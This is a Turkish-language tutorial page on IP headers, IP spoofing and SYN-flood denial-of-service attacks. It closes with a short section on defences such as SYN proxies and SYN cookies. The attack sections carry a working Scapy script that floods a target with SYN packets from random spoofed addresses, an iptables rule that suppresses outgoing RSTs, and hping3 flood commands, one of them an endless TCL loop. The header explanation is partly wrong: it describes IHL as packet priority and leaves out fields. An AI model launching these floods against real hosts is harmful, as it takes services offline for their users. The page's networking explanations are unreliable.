---
title: DDOS
draft: false
weight: 4
date: 2017-02-28T07:21:11-05:00
summary: DDOS ve IP Spoofing
---

<h2 id="ip-nedir">IP NEDİR?</h2>

<p>IP(Internet Protocol):Her bir makinanın kendine ait eşsiz bir adresi olsun ve birbirleriyle bu protocol sayesinde erişebilsin diye geliştirilmişbir protokoldür.</p>



<h2 id="ip-başlık-bilgisi">IP Başlık Bilgisi</h2>

<p><img src="/ip-headerr.png" alt="ddos"></p>

<ul>
<li><strong>Version</strong>: (4bit)</li>
</ul>

<p>Gelen paketin IPv4 veya IPv6 olduğunun yorumlandığı <br>
   kısım.</p>

<ul>
<li><strong>IHL</strong>: (4bit)</li>
</ul>

<p>Yollanan pakete nasıl davranılacağını bildiren kısım. Acil mi veya bekleyecek mi vs.</p>

<ul>
<li><strong>Total Length</strong>: (16bit)</li>
</ul>

<p>2^16 = 65535byte (Maksimum Toplam Uzunluk) Paketin uzunluk bilgisinin olduğu kısımdır.</p>

<ul>
<li><strong>Identification</strong>: (16bit)</li>
</ul>

<p>Kimlik bilgisi olarak eklenilen kısım. Host tarafından random oluşturulur.</p>

<ul>
<li><strong>Flags</strong>: (3bits)</li>
</ul>

<p>Yollanan IP paketinin sağlıklı bir şekilde geçirilip geçirilmemesi için yeri geldiğinde parçalanıp parçalanmaması hakkında <br>
   bilgi veren kısımdır.</p>

<ul>
<li><strong>Fragment Offset</strong>: (13bits)</li>
</ul>

<p>Paket parçalandıysa parça sırasını belirten kısım.</p>

<ul>
<li><strong>Time to Live</strong>: (8bit)</li>
</ul>

<p>Pakete verilen yaşam süresi. Eğer paket sonsuz döngüye girerse paketin kendini yok etmesi için verilen zamanı belirten kısım. (Kaç kere, saniye vs. değil)</p>

<ul>
<li><strong>Header Checksum</strong>: (16bit)</li>
</ul>

<p>Paketteki bilgiler bir fonksiyona sokulup elde edilen değer burada belirtilir. Paketi alan kişi buradaki bilgiyi alır ve paketi fonksiyona sokup tekrar aynı değeri alıp almadığını kontrol ederek paketin bozulup bozulmadığını anlar.</p>

<ul>
<li><strong>Source IP Address</strong>: (32bit)</li>
</ul>

<p>Paketi gönderenin ip adresi.</p>

<ul>
<li><strong>Destination IP Address</strong>: (32bit)</li>
</ul>

<p>Paketi alacak makinenin ip adresi.</p>



<h2 id="ip-spoofing-nedir">IP Spoofing Nedir?</h2>

<p>IP Sahteciliği olarak da bilinen IP Spoofing en basit tanımı ile bir bağlantıda IP adresinizi hedef sisteme farklı gösterme işlemine denir.</p>

<p><img src="/ip-spoofing.jpeg" alt="ddos"></p>



<h2 id="amacı">Amacı ?</h2>

<p>Genel amaç gönderenin ip adresini gizlemek olsa da ip adres tabanlı kimlik doğrulamayı atlamak için de kullanılabilir.</p>

<p>DDOS atakları bilinmeyen IP adreslerinden kaynaklanan paketlerin , hedef ağları ve cihazları aşırı yüklemek için genellikle bu tekniği kullanır.</p>

```
  Bir çok kullanıcı ip spoofingin ip değiştirilmek anlamına geldiğini <br>
  düşünür fakat asıl amaç bu değildir.

```



<h2 id="yöntemleri">Yöntemleri</h2>

<ul>
<li><strong>Proxy/Socks</strong></li>
</ul>

<p>Proxy değiştirerek ip adresini gizleme yöntemine denir.</p>

<ul>
<li><strong>IP paketlerini düzenleyerek</strong></li>
</ul>

<p>En etkili Ip Spoofing tekniğidir. Ip paketlerini düzenleme işlemini SCAPY ile yapabiliriz. Örnek olarak,</p>

```
  scapy tcp=TCP(sport=8080, dport=22, flags=”S”) 

  ip3=IP(src=”192.168.2.15”,dst=”192.168.2.13”) paket3=ip3/tcp 

  send(paket3)
```

<p>Bu şekilde 192.168.2.15 ip adresinin 8080 portundan 192.168.2.13 ip adresinin 22 portuna paket göndermiş olduk.</p>

```
  Bu yöntem kullanılarak tcp oturumu kurulabilmesi çok zordur.Eğer <br>
  seq/ack sayılarına sahipsek yapabiliriz veya hedef aygıtın yakınında <br>
  bir yönlendirici aygıtı kontrol ederseniz veya hedef ağ / Ana Makine <br>
  tarafından yönlendirilen paketleri kabul ederse tcp oturumu <br>
  kurabilirsiniz.
```



<h1 id="dosddos-ataklari">DOS/DDOS ATAKLARI</h1>



<h2 id="nedir">Nedir ?</h2>

<p>DOS atağı bir sistemi,servisi veya ağı işlevini yerine getiremeyecek duruma getiren ataktır. Dos saldırılarının eş zamanlı olarak birden fazla kaynakla yapılmasına DDOS atağı denir.</p>



<h2 id="etkileri">ETKİLERİ ?</h2>

<ul>
<li>Serverlarda CPU/RAM problemi</li>
<li>Servislerin çökmesi</li>
<li>Ağ performansında yavaşlama</li>
<li>Web uygulamalarında geç yanıt döndürme veya erişilememe problemi</li>
</ul>



<h2 id="syn-flood">SYN FLOOD</h2>

<p>Sahte bir IP ile ( IP SPOOFING ) sürekli SYN paketi yollanır. Yollanan paketleri hedef  SYN tablosunda tutar. Hedefin döndürdüğü SYN+ACK paketi boşa gideceği için ve ACK geri dönmediği için tablonun boyutu artar.</p>

<p><img src=/syn-flood.jpeg" alt="ddos"></p>



<h2 id="syn-flood-ile-dosddos-saldırısı">SYN FLOOD ile DOS/DDOS Saldırısı</h2>

<p>SYN FLOOD saldırısı, sunucuya beklenen ACK kodunu göndermeyerek çalışan bir ataktır. Kötü niyetli istemci ya basit bir şekilde beklenen ACK‘yı göndermez ya da sahte IP adresi kullanarak SYN‘deki IP adres kaynağını zehirler(spoofing). Çünkü sunucu sahte IP adresine SYN-ACK göndermeye çalışır. Ancak ACK gönderemeyecektir çünkü o adresle bir SYN gönderilmediğini bilir.</p>

<p>Sunucu bir süre acknowledgement (kabul) için bekleyecektir. Fakat saldırılarda bu istekler sürekli artan şekilde olduğundan sunucu yeni bağlantı oluşturamaz duruma gelir. Ve sunucu devre dışı kalır.</p>



<h2 id="scapy-ile-synflood-saldırısı">Scapy ile SynFlood Saldırısı</h2>

<p>Öncesinde aşağıdaki iptables kuralının girlmesi gerekiyor</p>

<p>iptables -t filter -A OUTPUT -p tcp –tcp-flags RST RST -j DROP</p>

```
! /usr/bin/python

import sys
import random
from scapy.all import *

def main(argv):     
    while(1):       
                send(IP(src=str(random.randint(1,255))+"."+str(random.randint(1,255))+"."+str(random.randint(1,255))+"."+str(random.randint(1,255)),dst=sys.argv[1],id=123,ttl=100)/TCP(sport=RandShort(),dport=80,seq=123456,ack=1000,window=1000,flags="S"))

if __name__ == "__main__":
    main(sys.argv[1:])
```



<h2 id="hping-ile-syn-flood-saldırısı">Hping ile Syn FLood Saldırısı</h2>

<p>Hping, TCP / IP protokolü için ücretsiz bir paket üreteci ve analizörüdür. Güvenlik denetim ve güvenlik duvarlarının ve ağlarının test edilmesi için yararlı araçlardan biridir ve artık Nmap Security Scanner’da da kullanılmaktadır. <br>
Windows ve MacOs için <a href="http://www.hping.org">http://www.hping.org</a> bu adresten,</p>

<p>Ubuntu için:</p>

`sudo apt-get install hping3`

<p>bu şekilde indirebilirsiniz.</p>

<p><strong>Kullanımı:</strong></p>

`hping3 [options] IP`

<p><strong>Bazı parametreleri</strong></p>

<p>-flood: Gelen yanıtları göstermeye hiç dikkat etmeden mümkün olduğunca hızlı paket gönderilir. <br>
-I: Arayüz kullanılacaktır (isteğe bağlı birden fazla arayüze bağlıysanız kullanınız) <br>
 -1: ICMP modu <br>
 -2: UDP modu <br>
 -a: Kaynağı IP spoof yapar. <br>
 -p: Hedef port <br>
 -S: SYN bayrağı gönderme <br>
 –rand-source: Random iplerden gönderme <br>
 -c  = Gönderilen paket sayısı . (0 ise sınırsız gönderir.) <br>
 -d = Hedef makineye gönderilen her paketin boyutu. <br>


<strong>Syn Flood Atak</strong></p>

`hping  --rand-source -S -d 500 -p <port> IP`

<p>Syn flood saldırısını TCL dili ile de yazabilirsiniz.</p>

```
sudo hping

hping3 { while {1} { hping send "ip(saddr=1.2.3.4,daddr=192.168.1.1)+tcp(sport=4231,dport=80,flags=s)" }
```

<h2 id="önlem">ÖNLEM ?</h2>

<ul>
<li><strong>Tablonun boyutunu arttırmak</strong>:</li>
</ul>

<p>Daha çok maliyet ve geçerli bir çözüm değil.</p>

<ul>
<li><strong>Syn proxy</strong>:</li>
</ul>

<p>Hedef ile arasında durarak SYN paketlerini kendi üzerine alır SYN+ACK gönderir. ACK geri geldiğinde paketi hedefe ulaştırır.</p>

```
  Syn proxy’i bütün portlara syn yollayarak tespit edebiliriz. Eğer <br>
  kapalı port yoksa syn proxy ile karşı karşıya olduğumuzu anlarız.
```

<ul>
<li><strong>Syn proxy cookie</strong>:</li>
</ul>

<p>Threeway Handshake esnasında değişmeyen 4 bilgi var. <br>
Bunlar: Source IP, Source Port, Destination IP, Destination Port</p>

<ol>
<li>Makine bir fonksiyon ile bu 4 bilgiyi ve bir de makine <br>
çalıştırılmaya başladığında RAM de random oluşan bir değeri <br>
topluyor.</li>
<li>Ardından bu “toplam”ı SYN isteği yollayan makinelere SYN+ACK <br>
döndüreceği zaman sequence number olarak kullanıyor.</li>
<li>Kendisine threeway handshake’in son aşaması olan ACK paketi <br>
döndüğünde ACK sayısı “toplam”+1 olmak zorundadır.</li>
<li>“toplam”+1 den 1 çıkarıp gelen ACK paketini doğruluyor.</li>
</ol>
